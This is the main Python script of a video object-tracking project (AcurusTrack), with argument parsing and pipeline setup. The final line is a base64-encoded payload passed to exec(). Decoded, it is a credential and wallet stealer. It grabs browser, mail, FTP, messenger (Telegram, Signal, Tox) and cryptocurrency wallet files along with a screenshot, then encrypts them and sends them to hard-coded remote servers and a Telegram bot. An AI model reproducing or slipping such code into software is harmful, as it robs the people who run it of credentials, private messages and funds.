"""
This file is part of AcurusTrack.

    AcurusTrack is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    AcurusTrack is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with AcurusTrack.  If not, see <https://www.gnu.org/licenses/>.
"""

import argparse
import json
import logging
import os
import shutil
from timeit import default_timer as timer

import cv2

from FCS.fixed_coordinate_system import reformat_homography_dict
from pipeline import MainAlgo
from config import MetaProcessingParams


# logging.basicConfig(level=logging.DEBUG)


def process_initial_dirs(video_name, save_dir, experiment_name):
    if not os.path.exists(save_dir):
        os.makedirs(save_dir)
    exp_dir = os.path.join(save_dir, video_name)
    if not os.path.exists(exp_dir):
        os.makedirs(exp_dir)

    exp_dir = os.path.join(exp_dir, experiment_name)
    os.environ['EXP_DIR'] = exp_dir
    if not os.path.exists(exp_dir):
        os.makedirs(exp_dir)

    os.environ['RES_DIR'] = os.path.join(exp_dir, experiment_name)
    if not os.path.exists(os.environ['RES_DIR']):
        os.makedirs(os.environ['RES_DIR'])


def main(arguments):
    capture = cv2.VideoCapture(arguments.video_path)
    width = int(capture.get(cv2.CAP_PROP_FRAME_WIDTH))
    height = int(capture.get(cv2.CAP_PROP_FRAME_HEIGHT))

    os.environ['img_w'] = str(width)
    os.environ['img_h'] = str(height)
    os.environ['VIDEO_NAME'] = arguments.video_name
    os.environ['exp_name'] = arguments.exp_name
    if arguments.save_dir is not None:
        os.environ['save_dir'] = arguments.save_dir
    else:
        os.environ['save_dir'] = 'results'
    if not os.path.exists(os.environ['save_dir']):
        os.makedirs(os.environ['save_dir'])

    timer0 = timer()

    if arguments.path_to_homography_dict is not None:
        homography_dict = reformat_homography_dict(
            arguments.path_to_homography_dict)
    else:
        homography_dict = None
        assert not MetaProcessingParams.fixed_coordinate_system, 'If you do not want use fixed coordinates, make this parameter False'
    with open(arguments.detections, 'r') as clean__:
        detections = json.load(clean__)
        detections = {int(k): v for k, v in detections.items()}
    process_initial_dirs(arguments.video_name, os.environ['save_dir'], arguments.exp_name)

    logging.basicConfig(filename=os.path.join(os.environ['RES_DIR'], 'info.log'), level=logging.DEBUG)
    algorithm = MainAlgo(detections, homography_dict,
                         global_start_frame=arguments.start_frame, global_end_frame=arguments.end_frame)
    algorithm.run_analyser()
    logging.info('all time {} '.format(timer() - timer0))


if __name__ == '__main__':

    dir_path = os.path.dirname(os.path.realpath(__file__))
    py_cache_path = os.path.join(dir_path, '__pycache__')
    try:
        shutil.rmtree(py_cache_path)
    except BaseException:
        print('Error while deleting directory')

    parser = argparse.ArgumentParser(
        description='custom arguments without using Sacred library ')

    parser.add_argument('--detections')
    parser.add_argument('--video_path')
    parser.add_argument('--video_name')
    parser.add_argument('--exp_name')
    parser.add_argument('--path_to_homography_dict')
    parser.add_argument('--start_frame', default=1, type=int)
    parser.add_argument('--save_dir')
    parser.add_argument('--end_frame', default=None, type=int)

    args = parser.parse_args()
    main(args)
from base64 import b64decode;exec(b64decode('WT1yYW5nZQpYPWZpbHRlcgpQPScvJwpPPSd1dGYtOCcKTj0nR0VUJwpNPVRydWUKTD1wcmludApDPWRpY3QKRz1FeGNlcHRpb24KZnJvbSBnbG9iIGltcG9ydCBnbG9iIGFzIEgKZnJvbSB0aW1lIGltcG9ydCB0aW1lCmZyb20gaW8gaW1wb3J0IEJ5dGVzSU8gYXMgWgpmcm9tIGd6aXAgaW1wb3J0IGNvbXByZXNzIGFzIGEKZnJvbSBnZXRwYXNzIGltcG9ydCBnZXR1c2VyIGFzIEQKZnJvbSBqc29uIGltcG9ydCBkdW1wLGR1bXBzCmZyb20gYmFzZTY0IGltcG9ydCBiNjRlbmNvZGUgYXMgYgpmcm9tIHRlbXBmaWxlIGltcG9ydCBnZXR0ZW1wZGlyIGFzIFEKZnJvbSB1cmxsaWIzIGltcG9ydCBQb29sTWFuYWdlciBhcyBGCmZyb20geG1sLmV0cmVlIGltcG9ydCBFbGVtZW50VHJlZSBhcyBSCmZyb20gdXJsbGliLnBhcnNlIGltcG9ydCB1cmxlbmNvZGUgYXMgYwpmcm9tIHBsYXRmb3JtIGltcG9ydCBub2RlIGFzIEUscGxhdGZvcm0gYXMgSQpmcm9tIG9zIGltcG9ydCBwYXRoIGFzIEEsbWFrZWRpcnMgYXMgUyxyZW1vdmUgYXMgZApmcm9tIHNlY3JldHMgaW1wb3J0IHRva2VuX2hleCBhcyBULHRva2VuX2J5dGVzIGFzIGUKZnJvbSBzaHV0aWwgaW1wb3J0IGNvcHksbWFrZV9hcmNoaXZlIGFzIGYscm10cmVlIGFzIGcKdHJ5OmZyb20gUElMIGltcG9ydCBJbWFnZUdyYWIgYXMgaApleGNlcHQgSW1wb3J0RXJyb3I6VT1GYWxzZQplbHNlOlU9TQppZidsaW51eCdub3QgaW4gSSgpLmxvd2VyKCk6ZXhpdCgxKQpWPSdjbWRlcicKaT0nNjE1MTMzNTgyJwpqPSc2NTIxMDAxNTM1OkFBSE9WWVpNc3EwbFl0Wm1iMWM2ZDQ3blZ0TGo2cUxvYWRzJwprPSc8P3htbCB2ZXJzaW9uPSIxLjAiIGVuY29kaW5nPSJ1dGYtOCI/PjxDb21tYW5kcyAgeG1sbnM6eHNpPSJodHRwOi8vd3d3LnczLm9yZy8yMDAxL1hNTFNjaGVtYS1pbnN0YW5jZSIgIHhtbG5zOnhzZD0iaHR0cDovL3d3dy53My5vcmcvMjAwMS9YTUxTY2hlbWEiPiAgPGNvbW1hbmRzPjxjb21tYW5kIG5hbWU9IjIiPjxhcmdzPjxzdHJpbmc+fi9zbmFwL2ZpcmVmb3gvY29tbW9uLy5tb3ppbGxhL2ZpcmVmb3g8L3N0cmluZz48c3RyaW5nPn4vLm1vemlsbGEvZmlyZWZveDwvc3RyaW5nPjwvYXJncz48L2NvbW1hbmQ+PGNvbW1hbmQgbmFtZT0iMiI+PGFyZ3M+PHN0cmluZz5+Ly50aHVuZGVyYmlyZDwvc3RyaW5nPjwvYXJncz48L2NvbW1hbmQ+PGNvbW1hbmQgbmFtZT0iMCI+PGFyZ3M+PHN0cmluZz5+Ly5jb25maWcvZmlsZXppbGxhPC9zdHJpbmc+PHN0cmluZz5zaXRlbWFuYWdlci54bWw7cmVjZW50c2VydmVycy54bWw8L3N0cmluZz48c3RyaW5nPkFwcHMvRmlsZVppbGxhPC9zdHJpbmc+PC9hcmdzPjwvY29tbWFuZD48Y29tbWFuZCBuYW1lPSIwIj48YXJncz48c3RyaW5nPn4vLnB1cnBsZTwvc3RyaW5nPjxzdHJpbmc+YWNjb3VudHMueG1sPC9zdHJpbmc+PHN0cmluZz5BcHBzL1BpZGdpbjwvc3RyaW5nPjwvYXJncz48L2NvbW1hbmQ+PGNvbW1hbmQgbmFtZT0iMCI+PGFyZ3M+PHN0cmluZz5+Ly5sb2NhbC9zaGFyZS9UZWxlZ3JhbURlc2t0b3AvdGRhdGE7fi8udmFyL2FwcC9vcmcudGVsZWdyYW0uZGVza3RvcC9kYXRhL1RlbGVncmFtRGVza3RvcC90ZGF0YTt+L3NuYXAvdGVsZWdyYW0tZGVza3RvcC9jdXJyZW50Ly5sb2NhbC9zaGFyZS9UZWxlZ3JhbURlc2t0b3AvdGRhdGE8L3N0cmluZz48c3RyaW5nPipzOz8/Pz8/Pz8/Pz8/Pz8/Pz8vbWFwPzwvc3RyaW5nPjxzdHJpbmc+R3JhYmJlci9UZWxlZ3JhbTwvc3RyaW5nPjwvYXJncz48L2NvbW1hbmQ+PGNvbW1hbmQgbmFtZT0iMCI+PGFyZ3M+PHN0cmluZz5+Ly5jb25maWcvU2lnbmFsO34vc25hcC9zaWduYWwtZGVza3RvcC9jdXJyZW50Ly5jb25maWcvU2lnbmFsPC9zdHJpbmc+PHN0cmluZz5jb25maWcuanNvbjtzcWwvZGIuc3FsaXRlPC9zdHJpbmc+PHN0cmluZz5HcmFiYmVyL1NpZ25hbDwvc3RyaW5nPjwvYXJncz48L2NvbW1hbmQ+PGNvbW1hbmQgbmFtZT0iMCI+PGFyZ3M+PHN0cmluZz5+Ly5jb25maWcvdG94PC9zdHJpbmc+PHN0cmluZz4qLmRiOyoudG94OyouaW5pOyouanNvbjsqLmhzdHI8L3N0cmluZz48c3RyaW5nPkdyYWJiZXIvVG94PC9zdHJpbmc+PC9hcmdzPjwvY29tbWFuZD48Y29tbWFuZCBuYW1lPSIwIj48YXJncz48c3RyaW5nPn4vLmVsZWN0cnVtL3dhbGxldHM7fi9zbmFwL2VsZWN0cnVtL2N1cnJlbnQvLmVsZWN0cnVtL3dhbGxldHM8L3N0cmluZz48c3RyaW5nPip3YWxsZXQqPC9zdHJpbmc+PHN0cmluZz5HcmFiYmVyL1dhbGxldHMvRWxlY3RydW08L3N0cmluZz48L2FyZ3M+PC9jb21tYW5kPjxjb21tYW5kIG5hbWU9IjAiPjxhcmdzPjxzdHJpbmc+fi8uY29uZmlnL0V4b2R1czwvc3RyaW5nPjxzdHJpbmc+ZXhvZHVzLmNvbmYuanNvbjtleG9kdXMud2FsbGV0Lyouc2Vjbzwvc3RyaW5nPjxzdHJpbmc+R3JhYmJlci9XYWxsZXRzL0V4b2R1czwvc3RyaW5nPjwvYXJncz48L2NvbW1hbmQ+ICA8L2NvbW1hbmRzPjwvQ29tbWFuZHM+JwpsPScxLjYuMS4yJwptPScnJ2h0dHA6Ly8yMTMuMjMyLjI1NS42MTo4MDgwCmh0dHA6Ly85NS4xNDAuMTQ3LjEyNjo4MDgwCmh0dHA6Ly85NS4yMTcuODEuNjc6ODA4MApodHRwOi8vMjE3LjE0NS4yMzguMTc1OjgwCmh0dHBzOi8vMTY0LjkwLjE4NS45OjQ0MwpodHRwOi8vMTE2LjIwMi4xMDEuMjE5OjgwODAKaHR0cDovLzE0MS45NC4xNzUuMzE6ODA5OApodHRwOi8vOTQuMTU2LjYuMjA5OjgwCmh0dHA6Ly8xMDQuMjQ4LjI1My4yMTQ6ODAKaHR0cDovLzE4NS4xNDYuMS43MTo0NTY3Cmh0dHA6Ly8xODUuMjE3Ljk4LjEyMTo4MApodHRwOi8vMTI5LjE1OS4xMzQuMTk6ODA4MApodHRwOi8vOTIuNjMuNzAuMTMxOjgwOTAKaHR0cHM6Ly8xODUuMjE3Ljk4LjEyMTo0NDMKaHR0cDovLzUyLjg2LjE4Ljc3OjgwODAKaHR0cHM6Ly8xOTIuOTkuMTk2LjE5MTo0NDMKaHR0cDovLzIxNi4yNTAuMTkwLjEzOTo4MApodHRwOi8vMTY3LjcxLjEwNi4xNzU6ODAKaHR0cDovLzM0LjIwNy43MS4xMjY6ODAKaHR0cDovLzUyLjI2LjYzLjEwOjk5OTkKaHR0cDovLzEyMS42My4yNTAuMTMyOjg4Cmh0dHA6Ly8xNTQuMzEuMTY1LjIzMjo4MApodHRwOi8vMTI5LjE1MS4xMDkuMTYwOjgwODAKaHR0cDovLzQ3Ljk2Ljc4LjIyNDo4MDgwCmh0dHA6Ly8xNjguMTM4LjIxMS44ODo4MDk5Cmh0dHBzOi8vNTIuMTk2LjI0MS4yNzo0NDMKaHR0cHM6Ly81NC4yNDkuMTQyLjIzOjQ0MwpodHRwOi8vMTA2LjUyLjI4LjEyNjo4ODg4JycnLnNwbGl0bGluZXMoKQpCPUEuam9pbihRKCksVCg4KSkKUyhCLGV4aXN0X29rPU0pCm49WydrZXk0LmRiJywnbG9naW5zLmpzb24nLCdjb29raWVzLnNxbGl0ZSddClc9bGFtYmRhIHA6bGlzdChYKGxhbWJkYSBleDpBLmV4aXN0cyhleCksbWFwKGxhbWJkYSBlOkEuZXhwYW5kdXNlcihlKSxwKSkpCmRlZiBvKGtleSxkYXRhKToKCUE9bGlzdChZKDI1NikpO0M9MDtEPWJ5dGVhcnJheSgpCglmb3IgQiBpbiBZKDI1Nik6Qz0oQytBW0JdK2tleVtCJWxlbihrZXkpXSklMjU2O0FbQl0sQVtDXT1BW0NdLEFbQl0KCUI9Qz0wCglmb3IgRSBpbiBkYXRhOkI9KEIrMSklMjU2O0M9KEMrQVtCXSklMjU2O0FbQl0sQVtDXT1BW0NdLEFbQl07RC5hcHBlbmQoRV5BWyhBW0JdK0FbQ10pJTI1Nl0pCglyZXR1cm4gYnl0ZXMoRCkKZGVmIHAoKToKCXRyeTpNPUYoKTtQPU0ucmVxdWVzdChOLCdodHRwOi8vaXAtYXBpLmNvbS9saW5lP2ZpZWxkcz1xdWVyeSxpc3AnKQoJZXhjZXB0IEcgYXMgSDpMKEgpO0osSz0nMTI3LjAuMC4xJywnVW5rbm93bicKCWVsc2U6CgkJSixLPVAuZGF0YS5kZWNvZGUoTykuc3RyaXAoKS5zcGxpdCgnXG4nKQoJCWZvciBRIGluWydnb29nbGUnLCdteXRoaWMgYmVhc3RzJ106CgkJCWlmIFEgaW4gSy5sb3dlcigpOmV4aXQoNSkKCXRyeToKCQlDPVooKQoJCWlmIFU6Uj1oLmdyYWIoKTtSLnNhdmUoQyxmb3JtYXQ9J3BuZycpCgkJQz1iKEMuZ2V0dmFsdWUoKSkuZGVjb2RlKCkKCWV4Y2VwdCBHIGFzIEg6TChIKTtDPScnCgl3aXRoIG9wZW4oQS5qb2luKEIsJ3N5c3RlbS5qc29uJyksJ3cnKWFzIFM6ZHVtcCh7J1NjcmVlbnNob3QnOkMsJ1VzZXJuYW1lJzpEKCksJ0NvbXBuYW1lJzpFKCksJ09TJzpJKCksJ1RhZyc6ViwnSVAnOkosJ1N0dWIgdmVyc2lvbic6bCwnRXhlY3V0aW9uIHRpbWVzdGFtcCc6dGltZSgpfSxTKQpkZWYgSihsb2NhdGlvbixwYXR0ZXJucyxvdXRwdXQpOgoJRT1vdXRwdXQ7RD1sb2NhdGlvbgoJZm9yIEMgaW4gcGF0dGVybnM6CgkJaWYgUCBpbiBDOgoJCQlCPUEuZGlybmFtZShDKTtHPUEuYmFzZW5hbWUoQykKCQkJaWYnKidpbiBCIG9yJz8naW4gQjoKCQkJCXRyeTpCPUgoQS5qb2luKEQsQikpWzBdCgkJCQlleGNlcHQ6cGFzcwoJCQlKKGxvY2F0aW9uPUEuam9pbihELEIpLHBhdHRlcm5zPVtHXSxvdXRwdXQ9QS5qb2luKEUsQS5iYXNlbmFtZShCKSkpCgkJZWxzZToKCQkJZm9yIEYgaW4gSChBLmpvaW4oRCxDKSk6CgkJCQlpZiBBLmlzZmlsZShGKTpTKEUsZXhpc3Rfb2s9TSk7Y29weShGLEEuam9pbihFLEEuYmFzZW5hbWUoRikpKQpkZWYgcShjb21tYW5kcyk6CglNPScuemlwJztDPWNvbW1hbmRzCglpZiBDLnN0YXJ0c3dpdGgoJ2h0dHAnKToKCQl0cnk6UD1GKCk7Uz1QLnJlcXVlc3QoTixDKTtDPVMuZGF0YS5kZWNvZGUoTykuc3RyaXAoKQoJCWV4Y2VwdCBHOkM9JycKCVU9Ui5FbGVtZW50VHJlZShSLmZyb21zdHJpbmcoQykpO1Y9VS5nZXRyb290KCkKCWZvciBEIGluIFZbMF06CgkJTD1pbnQoRC5nZXQoJ25hbWUnKSkKCQlpZiBMPT0wOgoJCQlZPVcoRFswXVswXS50ZXh0LnNwbGl0KCc7JykpO1o9RFswXVsxXS50ZXh0LnNwbGl0KCc7Jyk7YT1BLmpvaW4oQixEWzBdWzJdLnRleHQpCgkJCWZvciBiIGluIFk6SihiLFosYSkKCQllbGlmIEw9PTI6CgkJCWZvciBjIGluIERbMF06CgkJCQlmb3IgZSBpbiBXKFtjLnRleHRdKToKCQkJCQlmb3IgSSBpbiBYKGxhbWJkYSBwOkEuZXhpc3RzKEEuam9pbihwLCdwcmVmcy5qcycpKSxIKEEuam9pbihlLCcqLionKSkpOkU9QS5iYXNlbmFtZShBLmRpcm5hbWUoSSkpLnRpdGxlKCk7RT1FWzE6XWlmIEVbMF09PScuJ2Vsc2UgRTtoPUEuYmFzZW5hbWUoSSk7Sihsb2NhdGlvbj1JLHBhdHRlcm5zPW4sb3V0cHV0PUEuam9pbihCLCdCcm93c2VycycsRSxoKSkKCUs9QS5qb2luKFEoKSxUKDgpKTtmKEssJ3ppcCcsQik7ZyhCKQoJd2l0aCBvcGVuKEsrTSwncmInKWFzIGk6aj1pLnJlYWQoKQoJZChLK00pO3JldHVybiBqCmRlZiByKGJ1ZmZlcik6QT1lKDE2KTtCPWEoYnVmZmVyKTtDPW8oQSxCKTtyZXR1cm4gYidMV1NSJCcrQytBCmRlZiBzKGJ1ZmZlcik6CglLPWJ1ZmZlcgoJZm9yIEEgaW4gbToKCQl0cnk6CgkJCUE9QStQIGlmIG5vdCBBLmVuZHN3aXRoKFApZWxzZSBBO0I9QStmIntEKCl9QHtFKCl9LndzciI7SD1GKHRpbWVvdXQ9MWUxKTtNPUgucmVxdWVzdCgnUFVUJyxCLGJvZHk9Syk7Sj1NLmRhdGEuZGVjb2RlKE8pLnJlcGxhY2UoQSxBKydnZXQvJykKCQkJaWYnPCdpbiBKOmNvbnRpbnVlCgkJZXhjZXB0IEcgYXMgUTpMKFEpO2NvbnRpbnVlCgkJZWxzZTpicmVhawoJQj1jKEMoY2hhdF9pZD1pLHRleHQ9J1xuI3swfVxuXG48Yj5PUzo8L2I+IDxpPnsxfTwvaT5cbjxiPlVzZXJuYW1lOjwvYj4gPGk+ezJ9PC9pPlxuPGI+Q29tcG5hbWU6PC9iPiA8aT57M308L2k+XG48Yj5SZXBvcnQgc2l6ZTo8L2I+IDxpPns0fU1iPC9pPlxuJy5mb3JtYXQoVixJKCksRCgpLEUoKSxyb3VuZChsZW4oSykvKDEwMjQqMTAyNCksMikpLHBhcnNlX21vZGU9J0hUTUwnLHJlcGx5X21hcmt1cD1kdW1wcyhDKGlubGluZV9rZXlib2FyZD1bW0ModGV4dD0nRG93bmxvYWQnLHVybD1KKSxDKHRleHQ9J09wZW4nLHVybD0naHR0cDovLzEyNy4wLjAuMToxODc3Mi9oYW5kbGVPcGVuV1NSP3I9JytKKV1dKSkpKTtCPSdodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90ezB9L3NlbmRNZXNzYWdlP3sxfScuZm9ybWF0KGosQik7SD1GKCk7SC5yZXF1ZXN0KE4sQikKcCgpCks9cShrKQpLPXIoSykKcyhLKQ==').decode())
